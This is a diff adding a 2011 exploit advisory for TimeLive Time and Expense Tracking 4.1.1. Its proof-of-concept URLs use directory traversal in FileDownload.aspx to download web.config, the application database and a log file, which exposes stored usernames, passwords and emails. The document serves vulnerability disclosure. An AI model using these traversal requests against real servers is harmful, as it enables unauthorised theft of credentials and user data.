@@ -1,0 +1,35 @@
+###############################################################################
+# Exploit Title	: TimeLive Time and Expense Tracking <= Multiple Vulnerabilities
+# Vulnerability	: Directory Traversal / Remote Database Download / File Download / Source Code Disclosure
+# Date		: 28/09/2011
+# Author	: Nathaniel Carew
+# Impact	: High
+# Software Link	: http://www.livetecs.com/Release/TimeLiveWebSetup.exe
+# Platform	: ASP.NET
+# Version	: 4.1.1
+# Tested on	: Windows Server Standard 2003 SP 2 / IIS 6
+# Thanks	: Peregrinus & shiznat
+###############################################################################
+
+Overview:
+---------
+When using the import/export feature for csv/project/quickbooks files under:
+
+http://localhost/TimeLive/AccountAdmin/AccountImportExport.aspx
+
+You are able to modify the file download URL you are redirected too 
+and traverse directories to download the hosted files including the TimeLive database:
+
+Proof of Concept:
+-----------------
+http://localhost/TimeLive/Shared/FileDownload.aspx?FileName=..\web.config
+http://localhost/TimeLive/Shared/FileDownload.aspx?FileName=..\App_Data\TimeLive.mdf
+http://localhost/TimeLive/Shared/FileDownload.aspx?FileName=..\Log\TimeLive.log
+
+Impact:
+-------
+Successful exploitation could allow an attacker to download the complete database of users information
+including email addresses, usernames and passwords and associated timesheet and expense data along with
+any files contained within the subfolder of wwwroot.
+
+
